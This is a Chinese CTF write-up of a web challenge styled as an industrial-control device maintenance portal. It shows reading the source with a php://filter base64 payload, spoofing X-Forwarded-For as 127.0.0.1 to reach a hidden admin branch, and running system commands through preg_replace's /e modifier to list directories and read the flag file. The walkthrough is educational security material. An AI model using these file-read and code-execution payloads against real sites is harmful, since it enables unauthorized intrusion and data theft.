## 题目描述

其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统

## 思路

打开题目，是一个工控管理系统

![20190831132614.png](https://raw.githubusercontent.com/handbye/images/master/20190831132614.png)

随意点点左侧菜单，发现只有设备维护中心可以点击，点进去：

![20190831132720.png](https://raw.githubusercontent.com/handbye/images/master/20190831132720.png)

空白页面，啥都没，再随意点点

![20190831132813.png](https://raw.githubusercontent.com/handbye/images/master/20190831132813.png)

发现点击题目标题的时候出现了`index`,并且url链接也变了，而且在page后面改变任意字符都会显示在页面中。

![20190831132951.png](https://raw.githubusercontent.com/handbye/images/master/20190831132951.png)

将page参数改为index.php查看，页面显示OK

![20190831133046.png](https://raw.githubusercontent.com/handbye/images/master/20190831133046.png)

将page参数改为flag.php查看,页面啥都没显示

![20190831133123.png](https://raw.githubusercontent.com/handbye/images/master/20190831133123.png)

以上测试表明index.php是存在的，我们尝试读取index.php的内容

这里需要用到`php://filter`

php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；

详细信息请参考[php://filter 的使用](https://blog.csdn.net/destiny1507/article/details/82347371)

构造：`php://filter/read=convert.base64-encode/resource=index.php` 即可读取index.php的内容

![20190831134130.png](https://raw.githubusercontent.com/handbye/images/master/20190831134130.png)

然后base64解码：

```php
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>设备维护中心</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>设备列表</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- 这里的 checked 的状态只是演示 -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: '设备名', templet: '#nameTpl' },
                     { field: 'area', title: '区域' },
                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}





?>

</body>

</html>

```

重点看下面这一段代码：

![20190831134317.png](https://raw.githubusercontent.com/handbye/images/master/20190831134317.png)

先将http头的X-Forwarded-For改为127.0.0.1

![20190831134416.png](https://raw.githubusercontent.com/handbye/images/master/20190831134416.png)

审计PHP preg_replace() 函数

```php
preg_replace 函数执行一个正则表达式的搜索和替换。

语法

mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

参数说明：

$pattern: 要搜索的模式，可以是字符串或一个字符串数组。

$replacement: 用于替换的字符串或字符串数组。

$subject: 要搜索替换的目标字符串或字符串数组。

$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。

$count: 可选，为替换执行的次数。
```

PHP 的 preg_replace()函数存在一个安全问题：

/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

示例：

```php
preg_replace("/test/e",$_GET["h"],"jutst test");
```

如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。这个正则被正确的匹配到，在进行替换的过程中，需要将$_GET["h"]传入的String当作函数来运行，因此phpinfo()被成功执行。

代码如下：

```php
<?php
preg_replace("/test/e",$_GET["h"],"jutst test");
?>
```

访问的url：?h=phpinfo()就会触发phpinfo()的执行

在本题中我们传入：?pat=/test/e&rep=phpinfo()&sub=just test 就会触发phpinfo()的执行

![20190831135501.png](https://raw.githubusercontent.com/handbye/images/master/20190831135501.png)

同样执行系统命令：

```php
?pat=/test/e&rep=system("ls")&sub=just test
```

![20190831135609.png](https://raw.githubusercontent.com/handbye/images/master/20190831135609.png)

```php
?pat=/test/e&rep=system("cd s3chahahaDir;ls -la")&sub=just test
```

![20190831135945.png](https://raw.githubusercontent.com/handbye/images/master/20190831135945.png)

```php
?pat=/test/e&rep=system("cd s3chahahaDir/flag;ls -la")&sub=just test
```

![20190831140023.png](https://raw.githubusercontent.com/handbye/images/master/20190831140023.png)

```php
?pat=/test/e&rep=system("cat s3chahahaDir/flag/flag.php")&sub= just test
```

![20190831141725.png](https://raw.githubusercontent.com/handbye/images/master/20190831141725.png)

Flag是注释在网页中的，这点需要注意。
